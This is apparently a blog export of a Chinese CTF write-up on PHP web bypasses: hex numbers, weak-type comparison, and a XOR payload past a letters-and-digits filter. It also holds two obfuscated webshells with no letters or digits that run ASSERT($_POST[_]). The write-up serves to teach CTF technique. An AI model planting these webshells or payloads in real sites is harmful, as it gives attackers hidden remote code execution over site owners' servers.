alt=\"image-20210719062711350\"></p>\n<p>此处payload要再次进行编码才能使用</p>\n</li>\n</ol>\n<p>总结流程：</p>\n<p><strong>1.探测开放端口（这道题不用）</strong></p>\n<p><strong>2.本地构造攻击流量，通过监听端口然后url转码的形式</strong></p>\n<p><strong>3.ssrf攻击</strong></p>\n<blockquote>\n<p>参考</p>\n<p><a href=\"https://liloong3t.com/2021/02/16/2021-2-16-ssrf-shi-yong-gopher-xie-yi/\" target=\"_blank\" rel=\"noopener\">https://liloong3t.com/2021/02/16/2021-2-16-ssrf-shi-yong-gopher-xie-yi/</a></p>\n<p><a href=\"https://blog.csdn.net/mysteryflower/article/details/94386461\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/mysteryflower/article/details/94386461</a></p>\n<p><a href=\"https://blog.csdn.net/shreck66/article/details/50355729\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/shreck66/article/details/50355729</a></p>\n<p><a href=\"https://blog.csdn.net/rfrder/article/details/108589988\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/rfrder/article/details/108589988</a></p>\n</blockquote>\n"},{"title":"CTF——Web安全中的一些绕过","date":"2021-09-10T06:01:09.383Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n\n\n# CTF——Web安全中的一些绕过\n\n- Learning from [淚笑](https://www.cnblogs.com/leixiao-/)、[Angel_Kitty](https://www.cnblogs.com/ECJTUACM-873284962/)、[离别歌](https://www.leavesongs.com/)\n\n\n\n## 利用数的十六进制\n\n```php\nfunction check($number)\n{\n    $one = ord('1');\n    $nine = ord('9');\n    for ($i = 0; $i < strlen($number); $i++)\n    {\n        $digit = ord($number{$i});\n        if ( ($digit >= $one) && ($digit <= $nine) )\n        {\n            return false;\n        }\n    }\n    return $number == '11259375';\n}\n```\n\n\n\n用11259375的16进制形式0xabcdef\n\n\n\n## 弱类型比较\n\n```php\n$num=$_GET['num'];\nif(!is_numeric($num))\n {\n     echo $num;\n     if($num==1)\n         echo 'flag{**********}';\n }\n```\n\n\n\n不能用16进制形式0x1或前面加0形式0001或者科学计数法形式0e0，因为都会被判断为数字。但可以提交1xxx,后面跟上除了数字，点（两个点可以：1..）以外任意字符即可，php用==比较字符串和数字时，会把字符串隐式转换为数字，如果字符串中有非数字字符，只取最前面的数字，例如\"1x\"=1,\"22asd\"=22,\"qwe123\"=0\n\n\n\n## 正则匹配绕过\n\n### 方法一：异或\n\n```php\n<?php\n\nfunction getFlag()\n{\n    echo \"flagxxxxxxx\";\n}\n\nif(isset($_GET['code']))\n{\n    $code = $_GET['code'];\n\n    if(strlen($code)>40)\n    {\n        die(\"Long.\");\n    }\n    if(preg_match(\"/[A-Za-z0-9]+/\",$code))\n    {\n        die(\"NO.\");\n    }\n\n    @eval($code);\n}\n//$hint =  \"php function getFlag() to get flag\";\n?>\n```\n\n> ?code=$_=\"<%)},?'\"^\"[@];@^@\";$_();  \n\n\n\n两句php代码，第一句 $\\_=\" <%)},?' \" ^ \" [@];@^@ \"; 是把两个字符串异或运算结果赋给$\\_变量，\" <%)},?' \" 这个含7个字符的字符串和 \" [@];@^@ \" 异或的结果就是getFlag，然后第二句php代码 $_(); 就相当于getFlag();若是过滤了下划线，则 ${\" } \" ^ \" ; \"} = \" <%)},?' \" ^ \" [@];@^@ \";  ${\" } \" ^ \" ; \"}();\n\n\n\n### --方法二：取反\n\n“如何编写一个不使用数字和字母的webshell”，具体为如下代码：\n\n```php\n<?php\nif(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {\n  eval($_GET['shell']);\n}\n```\n\n\n\n利用UTF-8编码的某个汉字，并将其中某个字符取出来，比如`'和'{2}`的结果是`\"\\x8c\"`，其取反即为字母`s`\n\n![14872686600768.jpg](https://gitee.com/h1ler/tuci/raw/master/null/fadccb70-4143-49df-aa47-bc9a1af93c56.97e405012da5.jpg)\n\n\n\n利用这个特性生成如下答案：\n\n```php\n<?php\n$__=('>'>'<')+('>'>'<');\n$_=$__/$__;\n\n$____='';\n$___=\"瞰\";$____.=~($___{$_});$___=\"和\";$____.=~($___{$__});$___=\"和\";$____.=~($___{$__});$___=\"的\";$____.=~($___{$_});$___=\"半\";$____.=~($___{$_});$___=\"始\";$____.=~($___{$__});\n\n$_____='_';$___=\"俯\";$_____.=~($___{$__});$___=\"瞰\";$_____.=~($___{$__});$___=\"次\";$_____.=~($___{$_});$___=\"站\";$_____.=~($___{$_});\n\n$_=$$_____;\n$____($_[$__]);\n```\n\n![14871906748025.jpg](https://gitee.com/h1ler/tuci/raw/master/null/82b376a7-08a8-4e20-9686-553f400d280d.d8b4b6b1530c.jpg)\n\n这个答案还利用了PHP的弱类型特性。因为要获取`'和'{2}`，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故`true+true==2`，也就是`('>'>'<')+('>'>'<')==2`。\n\n\n\n### --方法三：字符变量自增\n\n题目源代码在方法二中\n\n[源自官方文档]: http://php.net/manual/zh/language.operators.increment.php\n\n![image-20201021010048673](https://gitee.com/h1ler/tuci/raw/master/null/image-20201021010048673.png)\n\n也就是说，`'a'++ => 'b'`，`'b'++ => 'c'`... \n\n所以，只要能拿到一个变量，其值为`a`，通过自增操作即可获得a-z中所有字符。\n\n那么，如何拿到一个值为字符串'a'的变量呢？\n\n巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，可以同时拿到小写和大写A，等于就可以拿到a-z和A-Z的所有字母。\n\n在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为`Array`：\n\n![14872697183159.jpg](https://www.leavesongs.com/media/attachment/2017/02/17/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.72f524026162.jpg)\n\n再取这个字符串的第一个字母，就可以获得'A'了。\n\n利用这个技巧，编写如下webshell（因为PHP函数是大小写不敏感的，所以最终执行的是`ASSERT($_POST[_])`，无需获取小写a）：\n\n```php\n<?php\n$_=[];\n$_=@\"$_\"; // $_='Array';\n$_=$_['!'=='@']; // $_=$_[0];\n$___=$_; // A\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__; // S\n$___.=$__; // S\n$__=$_;\n$__++;$__++;$__++;$__++; // E \n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$___.=$__;\n\n$____='_';\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$____.=$__;\n\n$_=$$____;\n$___($_[_]); // ASSERT($_POST[_]);<?php\n$_=[];\n$_=@\"$_\"; // $_='Array';\n$_=$_['!'=='@']; // $_=$_[0];\n$___=$_; // A\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__; // S\n$___.=$__; // S\n$__=$_;\n$__++;$__++;$__++;$__++; // E \n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$___.=$__;\n\n$____='_';\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$____.=$__;\n\n$_=$$____;\n$___($_[_]); // ASSERT($_POST[_]);\n```\n\n执行结果：\n\n![14872701052595.jpg](https://gitee.com/h1ler/tuci/raw/master/null/d92e3d40-a451-4fc4-a516-e0747b721c69.2b122097850e.jpg)\n\n\n\n> 详见：\n>\n> https://www.leavesongs.com/penetration/webshell-without-alphanum.html \n>\n> https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html\n\n\n\n## 待续。。。\n\n","source":"_posts/CTF——Web安全中的一些绕过.md","raw":"---\ntitle: CTF——Web安全中的一些绕过\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: CTF\ncategories: CTF\n\n---\n\n\n\n# CTF——Web安全中的一些绕过\n\n- Learning from [淚笑](https://www.cnblogs.com/leixiao-/)、[Angel_Kitty](https://www.cnblogs.com/ECJTUACM-873284962/)、[离别歌](https://www.leavesongs.com/)\n\n\n\n## 利用数的十六进制\n\n```php\nfunction check($number)\n{\n    $one = ord('1');\n    $nine = ord('9');\n    for ($i = 0; $i < strlen($number); $i++)\n    {\n        $digit = ord($number{$i});\n        if ( ($digit >= $one) && ($digit <= $nine) )\n        {\n            return false;\n        }\n    }\n    return $number == '11259375';\n}\n```\n\n\n\n用11259375的16进制形式0xabcdef\n\n\n\n## 弱类型比较\n\n```php\n$num=$_GET['num'];\nif(!is_numeric($num))\n {\n     echo $num;\n     if($num==1)\n         echo 'flag{**********}';\n }\n```\n\n\n\n不能用16进制形式0x1或前面加0形式0001或者科学计数法形式0e0，因为都会被判断为数字。但可以提交1xxx,后面跟上除了数字，点（两个点可以：1..）以外任意字符即可，php用==比较字符串和数字时，会把字符串隐式转换为数字，如果字符串中有非数字字符，只取最前面的数字，例如\"1x\"=1,\"22asd\"=22,\"qwe123\"=0\n\n\n\n## 正则匹配绕过\n\n### 方法一：异或\n\n```php\n<?php\n\nfunction getFlag()\n{\n    echo \"flagxxxxxxx\";\n}\n\nif(isset($_GET['code']))\n{\n    $code = $_GET['code'];\n\n    if(strlen($code)>40)\n    {\n        die(\"Long.\");\n    }\n    if(preg_match(\"/[A-Za-z0-9]+/\",$code))\n    {\n        die(\"NO.\");\n    }\n\n    @eval($code);\n}\n//$hint =  \"php function getFlag() to get flag\";\n?>\n```\n\n> ?code=$_=\"<%)},?'\"^\"[@];@^@\";$_();  \n\n\n\n两句php代码，第一句 $\\_=\" <%)},?' \" ^ \" [@];@^@ \"; 是把两个字符串异或运算结果赋给$\\_变量，\" <%)},?' \" 这个含7个字符的字符串和 \" [@];@^@ \" 异或的结果就是getFlag，然后第二句php代码 $_(); 就相当于getFlag();若是过滤了下划线，则 ${\" } \" ^ \" ; \"} = \" <%)},?' \" ^ \" [@];@^@ \";  ${\" } \" ^ \" ; \"}();\n\n\n\n### --方法二：取反\n\n“如何编写一个不使用数字和字母的webshell”，具体为如下代码：\n\n```php\n<?php\nif(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {\n  eval($_GET['shell']);\n}\n```\n\n\n\n利用UTF-8编码的某个汉字，并将其中某个字符取出来，比如`'和'{2}`的结果是`\"\\x8c\"`，其取反即为字母`s`\n\n![14872686600768.jpg](https://gitee.com/h1ler/tuci/raw/master/null/fadccb70-4143-49df-aa47-bc9a1af93c56.97e405012da5.jpg)\n\n\n\n利用这个特性生成如下答案：\n\n```php\n<?php\n$__=('>'>'<')+('>'>'<');\n$_=$__/$__;\n\n$____='';\n$___=\"瞰\";$____.=~($___{$_});$___=\"和\";$____.=~($___{$__});$___=\"和\";$____.=~($___{$__});$___=\"的\";$____.=~($___{$_});$___=\"半\";$____.=~($___{$_});$___=\"始\";$____.=~($___{$__});\n\n$_____='_';$___=\"俯\";$_____.=~($___{$__});$___=\"瞰\";$_____.=~($___{$__});$___=\"次\";$_____.=~($___{$_});$___=\"站\";$_____.=~($___{$_});\n\n$_=$$_____;\n$____($_[$__]);\n```\n\n![14871906748025.jpg](https://gitee.com/h1ler/tuci/raw/master/null/82b376a7-08a8-4e20-9686-553f400d280d.d8b4b6b1530c.jpg)\n\n这个答案还利用了PHP的弱类型特性。因为要获取`'和'{2}`，就必须有数字2。而PHP由于弱类型这个特性，true的值为1，故`true+true==2`，也就是`('>'>'<')+('>'>'<')==2`。\n\n\n\n### --方法三：字符变量自增\n\n题目源代码在方法二中\n\n[源自官方文档]: http://php.net/manual/zh/language.operators.increment.php\n\n![image-20201021010048673](https://gitee.com/h1ler/tuci/raw/master/null/image-20201021010048673.png)\n\n也就是说，`'a'++ => 'b'`，`'b'++ => 'c'`... \n\n所以，只要能拿到一个变量，其值为`a`，通过自增操作即可获得a-z中所有字符。\n\n那么，如何拿到一个值为字符串'a'的变量呢？\n\n巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，可以同时拿到小写和大写A，等于就可以拿到a-z和A-Z的所有字母。\n\n在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为`Array`：\n\n![14872697183159.jpg](https://www.leavesongs.com/media/attachment/2017/02/17/4d0c6bc9-5417-41b2-91ca-4e110e8d1350.72f524026162.jpg)\n\n再取这个字符串的第一个字母，就可以获得'A'了。\n\n利用这个技巧，编写如下webshell（因为PHP函数是大小写不敏感的，所以最终执行的是`ASSERT($_POST[_])`，无需获取小写a）：\n\n```php\n<?php\n$_=[];\n$_=@\"$_\"; // $_='Array';\n$_=$_['!'=='@']; // $_=$_[0];\n$___=$_; // A\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__; // S\n$___.=$__; // S\n$__=$_;\n$__++;$__++;$__++;$__++; // E \n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$___.=$__;\n\n$____='_';\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$____.=$__;\n\n$_=$$____;\n$___($_[_]); // ASSERT($_POST[_]);<?php\n$_=[];\n$_=@\"$_\"; // $_='Array';\n$_=$_['!'=='@']; // $_=$_[0];\n$___=$_; // A\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__; // S\n$___.=$__; // S\n$__=$_;\n$__++;$__++;$__++;$__++; // E \n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$___.=$__;\n\n$____='_';\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$____.=$__;\n\n$_=$$____;\n$___($_[_]); // ASSERT($_POST[_]);\n```\n\n执行结果：\n\n![14872701052595.jpg](https://gitee.com/h1ler/tuci/raw/master/null/d92e3d40-a451-4fc4-a516-e0747b721c69.2b122097850e.jpg)\n\n\n\n> 详见：\n>\n> https://www.leavesongs.com/penetration/webshell-without-alphanum.html \n>\n> https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html\n\n\n\n## 待续。。。\n\n","slug":"CTF——Web安全中的一些绕过","published":1,"updated":"2021-07-27T03:40:54.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cktfnuydj000ft8op58fgbo7z","content":"<h1 id=\"CTF——Web安全中的一些绕过\"><a href=\"#CTF——Web安全中的一些绕过\" class=\"headerlink\" title=\"CTF——Web安全中的一些绕过\"></a>CTF——Web安全中的一些绕过</h1><ul>\n<li>Learning from <a href=\"https://www.cnblogs.com/leixiao-/\" target=\"_blank\" rel=\"noopener\">淚笑</a>、<a href=\"https://www.cnblogs.com/ECJTUACM-873284962/\" target=\"_blank\" rel=\"noopener\">Angel_Kitty</a>、<a href=\"https://www.leavesongs.com/\" target=\"_blank\" rel=\"noopener\">离别歌</a></li>\n</ul>\n<h2 id=\"利用数的十六进制\"><a href=\"#利用数的十六进制\" class=\"headerlink\" title=\"利用数的十六进制\"></a>利用数的十六进制</h2><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token keyword\">function</span> <span class=\"token function\">check</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$number</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$one</span> <span class=\"token operator\">=</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$nine</span> <span class=\"token operator\">=</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'9'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$number</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token variable\">$digit</span> <span class=\"token operator\">=</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$number</span><span class=\"token punctuation\">{</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$digit</span> <span class=\"token operator\">>=</span> <span class=\"token variable\">$one</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$digit</span> <span class=\"token operator\">&lt;=</span> <span class=\"token variable\">$nine</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">return</span> <span class=\"token variable\">$number</span> <span class=\"token operator\">==</span> <span class=\"token string\">'11259375'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>用11259375的16进制形式0xabcdef</p>\n<h2 id=\"弱类型比较\"><a href=\"#弱类型比较\" class=\"headerlink\" title=\"弱类型比较\"></a>弱类型比较</h2><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token variable\">$num</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n <span class=\"token punctuation\">{</span>\n     <span class=\"token keyword\">echo</span> <span class=\"token variable\">$num</span><span class=\"token punctuation\">;</span>\n     <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$num</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n         <span class=\"token keyword\">echo</span> <span class=\"token string\">'flag{**********}'</span><span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>不能用16进制形式0x1或前面加0形式0001或者科学计数法形式0e0，因为都会被判断为数字。但可以提交1xxx,后面跟上除了数字，点（两个点可以：1..）以外任意字符即可，php用==比较字符串和数字时，会把字符串隐式转换为数字，如果字符串中有非数字字符，只取最前面的数字，例如”1x”=1,”22asd”=22,”qwe123”=0</p>\n<h2 id=\"正则匹配绕过\"><a href=\"#正则匹配绕过\" class=\"headerlink\" title=\"正则匹配绕过\"></a>正则匹配绕过</h2><h3 id=\"方法一：异或\"><a href=\"#方法一：异或\" class=\"headerlink\" title=\"方法一：异或\"></a>方法一：异或</h3><pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">getFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string\">\"flagxxxxxxx\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token variable\">$code</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'code'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">40</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Long.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/[A-Za-z0-9]+/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"NO.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    @<span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\" spellcheck=\"true\">//$hint =  \"php function getFlag() to get flag\";</span>\n<span class=\"token delimiter\">?></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<blockquote>\n<p>?code=$_=”&lt;%)},?’”^”[@];@^@”;$_();  </p>\n</blockquote>\n<p>两句php代码，第一句 $_=” &lt;%)},?’ “ ^ “ [@];@^@ “; 是把两个字符串异或运算结果赋给$_变量，” &lt;%)},?’ “ 这个含7个字符的字符串和 “ [@];@^@ “ 异或的结果就是getFlag，然后第二句php代码 $_(); 就相当于getFlag();若是过滤了下划线，则 ${“ } “ ^ “ ; “} = “ &lt;%)},?’ “ ^ “ [@];@^@ “;  ${“ } “ ^ “ ; “}();</p>\n<h3 id=\"–方法二：取反\"><a href=\"#–方法二：取反\" class=\"headerlink\" title=\"–方法二：取反\"></a>–方法二：取反</h3><p>“如何编写一个不使用数字和字母的webshell”，具体为如下代码：</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/[a-z0-9]/is'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'shell'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token function\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string\">'shell'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>利用UTF-8编码的某个汉字，并将其中某个字符取出来，比如<code>'和'{2}</code>的结果是<code>\"\\x8c\"</code>，其取反即为字母<code>s</code></p>\n<p><img src=\"https://gitee.com/h1ler/tuci/raw/master/null/fadccb70-4143-49df-aa47-bc9a1af93c56.97e405012da5.jpg\" alt=\"14872686600768.jpg\"></p>\n<p>利用这个特性生成如下答案：</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token delimiter\">&lt;?php</span>\n<span class=\"token variable\">$__</span><span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token string\">'>'</span><span class=\"token operator\">></span><span class=\"token string\">'&lt;'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token string\">'>'</span><span class=\"token operator\">></span><span class=\"token string\">'&lt;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$_</span><span class=\"token operator\">=</span><span class=\"token variable\">$__</span><span class=\"token operator\">/</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$____</span><span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token string\">\"瞰\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$____</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___</span><span class=\"token punctuation\">{</span><span class=\"token variable\">$_</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$___</span><span class=\"token operator\">=</span><span class=\"token string\">\"和\"</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$____</span><span class=\"token punctuation\">.</span><span class=\"token operator\">=</span><span class=\"token operator\">~</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___</span><span class=\"token punctuation\">{</span><span class=\"token variable\">$__</span><span class=\"token punctuation\">}</span><span class=\"token 